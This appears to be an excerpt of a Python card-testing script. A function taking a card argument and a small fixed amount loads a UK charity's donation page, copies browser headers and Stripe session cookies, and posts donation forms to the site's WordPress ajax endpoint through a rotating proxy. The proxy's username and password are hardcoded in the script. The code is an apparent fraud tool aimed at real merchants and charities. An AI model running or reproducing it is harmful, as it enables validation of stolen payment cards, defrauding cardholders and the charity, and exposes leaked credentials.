...
SITE_URL = "https://the-spray-box.myshopify.com/"

PROXY = "rp.scrapegw.com:6060:tye7ts1e9xm5axq:mbhusbvw0axeo9d"
class ShopProcessor:
    def __init__(self):
    ...
    def _parse_proxy(self, proxy_str):
        ...
        if http_match:
            ...
            return {
                'http': f'http://{hostport}:{user}@{password}',
                'https': f'http://{hostport}:{user}@{password}'
            }
...
def brn6(ccx, amount="1.10"):
    ...
    headers = {
        'authority': 'https://www.walsingham.org.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    ...
    response = r.get('https://www.walsingham.org.uk/donations/make-a-donation/', headers=headers)
    ...
    headers = {
	    ...
	    # 'cookie': 'ep_session_id=ep-sess-1766349766-iFJJVhZE; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-12-21%2021%3A42%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fcombatantcraftcrewman.org%2Fmake-a-donation%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-12-21%2021%3A42%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fcombatantcraftcrewman.org%2Fmake-a-donation%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=7c8fd55f-70e7-4064-ba2a-1e80a54b0c3bfbb719; __stripe_sid=df04953e-66bb-411f-87a6-ecab93bc19f31afce9; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcombatantcraftcrewman.org%2Fmake-a-donation%2F',
	    'origin': 'https://www.walsingham.org.uk',
	    'referer': 'https://www.walsingham.org.uk/donations/make-a-donation/',
    ...
    data = {
	    ...
	    'give-form-url': 'https://www.walsingham.org.uk/donations/make-a-donation/',
    ...
    response = r.post('https://www.walsingham.org.uk/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    ...
    response = r.post(
        'https://walsingham.org.uk/wp-admin/admin-ajax.php',
        params=params,
        headers=headers,
        data=multipart_data,
    )
